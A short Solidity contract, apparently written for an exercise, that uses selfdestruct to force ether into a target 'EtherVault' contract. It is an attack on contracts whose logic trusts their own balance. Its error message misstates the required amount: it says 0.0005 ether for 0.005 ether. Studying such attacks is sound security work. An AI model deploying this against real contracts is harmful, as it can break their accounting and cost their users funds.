// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

contract SelfDestruct_byMazi {
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function destroyEtherVault(address EtherVaultAddress) payable external {
        require(msg.sender == owner, "Not authorized");
        require(msg.value == 5000000000000000 wei, "Must send exactly 0.0005 ether");
        selfdestruct((payable(EtherVaultAddress)));
    }
}
